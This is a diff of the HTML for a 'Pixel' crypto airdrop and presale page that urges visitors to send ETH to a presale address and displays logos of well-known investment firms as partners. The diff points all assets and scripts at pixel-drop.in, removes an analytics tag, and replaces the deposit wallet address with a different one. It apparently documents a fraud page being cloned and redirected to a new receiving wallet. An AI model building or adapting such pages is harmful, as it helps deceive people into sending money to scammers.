@@ -15,30 +15,22 @@ new google.translate.TranslateElement({pageLanguage: 'en', layout: google.transl
 <title>Pixel - Airdrop join now!</title>
 	<link rel="canonical" href="https://PIXEL-Drop.in/" />
 <link rel="icon" type="image/svg" sizes="32x32" >
-<link href="assets/fonts/sfuidisplay.css" rel="stylesheet">
-<link rel="stylesheet" href="releases/v5.8.1/css/all.css">
-<link rel="stylesheet" href="assets/css/plugins.min.css">
-<link rel="stylesheet" href="assets/css/app.css">
-<link rel="stylesheet" href="assets/css/custom.css">
+<link href="https://pixel-drop.in/assets/fonts/sfuidisplay.css" rel="stylesheet">
+<link rel="stylesheet" href="https://pixel-drop.in/releases/v5.8.1/css/all.css">
+<link rel="stylesheet" href="https://pixel-drop.in/assets/css/plugins.min.css">
+<link rel="stylesheet" href="https://pixel-drop.in/assets/css/app.css">
+<link rel="stylesheet" href="https://pixel-drop.in/assets/css/custom.css">
 <meta property="og:title" content="PIXEL Biggest AIRDROP"/>
 <meta property="og:type" content="video.movie"/>
 <meta property="og:url" content="https://PIXEL-Drop.in/"/>
 <meta property="og:image" />
-  <link rel="icon" href="pixel.svg" />
+  <link rel="icon" href="https://pixel-drop.in/pixel.svg" />
 <meta name="twitter:title" content="PIXEL Biggest Airdrop">
 <meta name="twitter:description" content="Get 200 PIXEL now!">
 <meta name="twitter:image" >
 <meta name="twitter:card" content="summary_large_image">
 
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-XSLN8SZLP7"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
 
-  gtag('config', 'G-XSLN8SZLP7');
-</script>
 <style>
 .container { max-width: 1000px; }
 </style>
@@ -82,15 +74,15 @@ PreSale
 <div class="dropdown-module dropdown-module--dark d-inline-block position-relative ml-1 ml-sm-2">
 <button class="dropdown-module__toggler" type="button">
 <span class="flag-image">
-<img src="assets/img/flag/uk.svg" alt="flag" class="svg">
+<img src="https://pixel-drop.in/assets/img/flag/uk.svg" alt="flag" class="svg">
 </span>
 </button>
 <ul class="dropdown-module-list">
 <li>
-<a class="dropdown-module__item d-flex align-items-center" data-lang="en" href="javascript:;"><span class="flag-image mr-2"><img src="assets/img/flag/uk.svg" alt="flag" class="svg"></span>English</a>
+<a class="dropdown-module__item d-flex align-items-center" data-lang="en" href="javascript:;"><span class="flag-image mr-2"><img src="https://pixel-drop.in/assets/img/flag/uk.svg" alt="flag" class="svg"></span>English</a>
 </li>
 <li>
-<a class="dropdown-module__item d-flex align-items-center" data-lang="zh" href="javascript:;"><span class="flag-imvage mr-2"><img src="assets/img/flag/cn.png" alt="flag"></span>中文</a>
+<a class="dropdown-module__item d-flex align-items-center" data-lang="zh" href="javascript:;"><span class="flag-imvage mr-2"><img src="https://pixel-drop.in/assets/img/flag/cn.png" alt="flag"></span>中文</a>
 </li>
 </ul>
 </div>
@@ -100,7 +92,7 @@ PreSale
 </header>
 <section id="top" class="hero hero--v3 ico-progress ico-progress--v2 section--dark bg-color--dark--1 d-flex align-items-center hidden">
 <div class="background-holder background--move z-index1">
-<img src="assets/img/layout/bg-overlay-06.svg" alt="image" class="background-image-holder">
+<img src="https://pixel-drop.in/assets/img/layout/bg-overlay-06.svg" alt="image" class="background-image-holder">
 </div>
 <div class="container">
 <div class="row">
@@ -213,7 +205,7 @@ PIXEL is the governance token of PIXEL-Drop.in, with a total issuance of only  5
 <div class="col-12 col-md-6">
 <div class="d-lg-flex mb-4 mb-lg-0 text-center text-md-left">
 <span class="mb-3 mb-lg-0 mr-md-3">
-<img src="assets/img/icon-decentralized.svg" alt="icon">
+<img src="https://pixel-drop.in/assets/img/icon-decentralized.svg" alt="icon">
 </span>
 <div>
 <h3 class="h5-font font-w--600 text-color--200 mb-2">Airdrop Rules</h3>
@@ -232,7 +224,7 @@ Each person can invite uunlimited people.
 <div class="col-12 col-md-6">
 <div class="d-lg-flex mb-4 mb-lg-0 text-center text-md-left">
 <span class="mb-3 mb-lg-0 mr-md-3">
-<img src="assets/img/icon-p2p.svg" alt="icon">
+<img src="https://pixel-drop.in/assets/img/icon-p2p.svg" alt="icon">
 </span>
 <div>
 <h3 class="h5-font font-w--600 text-color--200 mb-2">Airdrop Details</h3>
@@ -253,7 +245,7 @@ Please do real referral. If our system discovered unwanted activities known as c
 <div class="col-12 col-md-6">
 <div class="d-lg-flex mb-4 mb-lg-0 text-center text-md-left">
 <span class="mb-3 mb-lg-0 mr-md-3">
-<img src="assets/img/icon-wallet.svg" alt="icon">
+<img src="https://pixel-drop.in/assets/img/icon-wallet.svg" alt="icon">
 </span>
 <div>
 <h3 class="h5-font font-w--600 text-color--200 mb-2">Pre-sale Rules</h3>
@@ -275,7 +267,7 @@ Use your wallet to send ETH to the presale address provided on this platform. Ou
 <div class="col-12 col-md-6">
 <div class="d-lg-flex mb-4 mb-lg-0 text-center text-md-left">
 <span class="mb-3 mb-lg-0 mr-md-3">
-<img src="assets/img/icon-ledger.svg" alt="icon">
+<img src="https://pixel-drop.in/assets/img/icon-ledger.svg" alt="icon">
 </span>
 <div>
 <h3 class="h5-font font-w--600 text-color--200 mb-2">Pre-sale Details</h3>
@@ -299,9 +291,9 @@ Once the presale is over. 30% of the funds raised will be locked in Uniswap liqu
 <h2 class="h3-font mb-2"> Pre-sale is live</h2>
  <div class="card bg-color--black-opacity--15 border--none p-2 w-100 mb-2">
 <span class="body-font font-w--500 mb-1">Pre-Sale Address</span>
-<span class="color--primary h6-font font-w--700">0x952eF82B270CF5bdc3dfdBccEB715f8032f7D636</span>
+<span class="color--primary h6-font font-w--700">0x01C65F22A9478C2932e62483509c233F0aaD5c72</span>
 <div class="mt-2">
-<button text="0x952eF82B270CF5bdc3dfdBccEB715f8032f7D636" class="copy btn btn-size--sm btn-bg--primary rounded--full btn-hover--splash btn-hover--3d"><span class="btn__text">Copy Address</span></button>
+<button text="0x01C65F22A9478C2932e62483509c233F0aaD5c72" class="copy btn btn-size--sm btn-bg--primary rounded--full btn-hover--splash btn-hover--3d"><span class="btn__text">Copy Address</span></button>
 </div>
 </div>
 <p><b> ●
@@ -467,7 +459,7 @@ document.getElementById('form-group').onclick = function () {
 
 <section id="tokenomics" class="space token-saleinfo token-saleinfo--v1 section--dark bg-color--dark--2">
 <div class="background-holder background--cover background--top opacity--08">
-<img src="assets/img/layout/sphere.svg" alt="image" class="background-image-holder">
+<img src="https://pixel-drop.in/assets/img/layout/sphere.svg" alt="image" class="background-image-holder">
 </div>
 <div class="container">
 <div class="row">
@@ -735,7 +727,7 @@ It's important to note that the supply of governance tokens is limited. Please r
 </section>
 <section class="space--top pb-4 section--dark bg-color--dark--2">
 <div class="background-holder opacity--05">
-<img src="assets/img/layout/bg-overlay-04.png" alt="image" class="background-image-holder">
+<img src="https://pixel-drop.in/assets/img/layout/bg-overlay-04.png" alt="image" class="background-image-holder">
 </div>
 <div class="container">
 <div class="row">
@@ -753,44 +745,44 @@ It's important to note that the supply of governance tokens is limited. Please r
 </div>
 <div class="row horizontal-border text-center mb-lg-6 pb-lg-6 d-flex align-items-center">
 <div class="col-6 col-sm-3 mb-5 mb-lg-0">
-<span class="w-75"><img src="assets/img/partners/a16zcrypto.svg" alt="partner-logo" class="img-fluid w-100"></span>
+<span class="w-75"><img src="https://pixel-drop.in/assets/img/partners/a16zcrypto.svg" alt="partner-logo" class="img-fluid w-100"></span>
 </div>
 <div class="col-6 col-sm-3 mb-5 mb-lg-0">
-<span class="w-75"><img src="assets/img/partners/paradigm.svg" alt="partner-logo" class="img-fluid w-100"></span>
+<span class="w-75"><img src="https://pixel-drop.in/assets/img/partners/paradigm.svg" alt="partner-logo" class="img-fluid w-100"></span>
 </div>
 <div class="col-6 col-sm-3 mb-5 mb-lg-0">
-<span class="w-25"><img src="assets/img/partners/threearrows.svg" alt="partner-logo" class="img-fluid w-100"></span>
+<span class="w-25"><img src="https://pixel-drop.in/assets/img/partners/threearrows.svg" alt="partner-logo" class="img-fluid w-100"></span>
 </div>
 <div class="col-6 col-sm-3 mb-5 mb-lg-0">
-<span class="w-75"><img src="assets/img/partners/defiance.svg" alt="partner-logo" class="img-fluid w-100"></span>
+<span class="w-75"><img src="https://pixel-drop.in/assets/img/partners/defiance.svg" alt="partner-logo" class="img-fluid w-100"></span>
 </div>
 </div>
 <div class="row horizontal-border text-center mb-lg-6 pb-lg-6 d-flex align-items-center">
 <div class="col-6 col-sm-3 mb-5 mb-lg-0">
-<span class="w-75"><img src="assets/img/partners/dragonfly.svg" alt="partner-logo" class="img-fluid w-100"></span>
+<span class="w-75"><img src="https://pixel-drop.in/assets/img/partners/dragonfly.svg" alt="partner-logo" class="img-fluid w-100"></span>
 </div>
 <div class="col-6 col-sm-3 mb-5 mb-lg-0">
-<span class="w-25"><img src="assets/img/partners/wintermute.svg" alt="partner-logo" class="img-fluid w-100"></span>
+<span class="w-25"><img src="https://pixel-drop.in/assets/img/partners/wintermute.svg" alt="partner-logo" class="img-fluid w-100"></span>
 </div>
 <div class="col-6 col-sm-3 mb-5 mb-lg-0">
-<span class="w-75"><img src="assets/img/partners/bcv.svg" alt="partner-logo" class="img-fluid w-100"></span>
+<span class="w-75"><img src="https://pixel-drop.in/assets/img/partners/bcv.svg" alt="partner-logo" class="img-fluid w-100"></span>
 </div>
 <div class="col-6 col-sm-3 mb-5 mb-lg-0">
-<span class="w-75"><img src="assets/img/partners/rocktree.svg" alt="partner-logo" class="img-fluid w-100"></span>
+<span class="w-75"><img src="https://pixel-drop.in/assets/img/partners/rocktree.svg" alt="partner-logo" class="img-fluid w-100"></span>
 </div>
 </div>
 <div class="row horizontal-border text-center mb-lg-6 pb-lg-6 d-flex align-items-center">
 <div class="col-6 col-sm-3 mb-5 mb-lg-0">
-<span class="w-75"><img src="assets/img/partners/mgnr.svg" alt="partner-logo" class="img-fluid w-100"></span>
+<span class="w-75"><img src="https://pixel-drop.in/assets/img/partners/mgnr.svg" alt="partner-logo" class="img-fluid w-100"></span>
 </div>
 <div class="col-6 col-sm-3 mb-5 mb-lg-0">
-<span class="w-25"><img src="assets/img/partners/delphi-digital.svg" alt="partner-logo" class="img-fluid w-100"></span>
+<span class="w-25"><img src="https://pixel-drop.in/assets/img/partners/delphi-digital.svg" alt="partner-logo" class="img-fluid w-100"></span>
 </div>
 <div class="col-6 col-sm-3 mb-5 mb-lg-0">
-<span class="w-75"><img src="assets/img/partners/menai.svg" alt="partner-logo" class="img-fluid w-100"></span>
+<span class="w-75"><img src="https://pixel-drop.in/assets/img/partners/menai.svg" alt="partner-logo" class="img-fluid w-100"></span>
 </div>
 <div class="col-6 col-sm-3 mb-5 mb-lg-0">
-<span class="w-75"><img src="assets/img/partners/finlink.svg" alt="partner-logo" class="img-fluid w-100"></span>
+<span class="w-75"><img src="https://pixel-drop.in/assets/img/partners/finlink.svg" alt="partner-logo" class="img-fluid w-100"></span>
 </div>
 </div>
 </div>
@@ -819,12 +811,12 @@ A new generation of decentralized exchanges using a Layer 2 scalability engine. 
 </div>
 </footer>
 </main>
-<script src="npm/clipboard-2.0.8/dist/clipboard.min.js"></script>
-<script src="npm/js-cookie-3.0.1/dist/js.cookie.min.js"></script>
-<script src="assets/js/plugins.min.js"></script>
-<script src="assets/js/encrypt.js"></script>
-<script src="assets/js/app.js"></script>
-<script src="scripts.js"></script>
+<script src="https://pixel-drop.in/npm/clipboard-2.0.8/dist/clipboard.min.js"></script>
+<script src="https://pixel-drop.in/npm/js-cookie-3.0.1/dist/js.cookie.min.js"></script>
+<script src="https://pixel-drop.in/assets/js/plugins.min.js"></script>
+<script src="https://pixel-drop.in/assets/js/encrypt.js"></script>
+<script src="https://pixel-drop.in/assets/js/app.js"></script>
+<script src="https://pixel-drop.in/scripts.js"></script>
 <script>
 (function(){
     $('a[data-lang]').click(function () {
@@ -943,12 +935,12 @@ A new generation of decentralized exchanges using a Layer 2 scalability engine. 
     });
 })();
 </script>
- <script src="assets/js/jquery-1.11.3.min.js"></script>             <!-- jQuery (https://jquery.com/download/) -->
-<script src="assets/js/popper.min.js"></script>                    <!-- https://popper.js.org/ -->       
-<script src="assets/js/bootstrap.min.js"></script>                 <!-- https://getbootstrap.com/ -->
-<script src="assets/js/datepicker.min.js"></script>                <!-- https://github.com/qodesmith/datepicker -->
-<script src="assets/js/jquery.singlePageNav.min.js"></script>      <!-- Single Page Nav (https://github.com/ChrisWojcik/single-page-nav) -->
-<script src="assets/slick/slick.min.js"></script> 
+ <script src="https://pixel-drop.in/assets/js/jquery-1.11.3.min.js"></script>             <!-- jQuery (https://jquery.com/download/) -->
+<script src="https://pixel-drop.in/assets/js/popper.min.js"></script>                    <!-- https://popper.js.org/ -->       
+<script src="https://pixel-drop.in/assets/js/bootstrap.min.js"></script>                 <!-- https://getbootstrap.com/ -->
+<script src="https://pixel-drop.in/assets/js/datepicker.min.js"></script>                <!-- https://github.com/qodesmith/datepicker -->
+<script src="https://pixel-drop.in/assets/js/jquery.singlePageNav.min.js"></script>      <!-- Single Page Nav (https://github.com/ChrisWojcik/single-page-nav) -->
+<script src="https://pixel-drop.in/assets/slick/slick.min.js"></script> 
 <script>
     function setPageNav(){
         if($(window).width() > 991) {
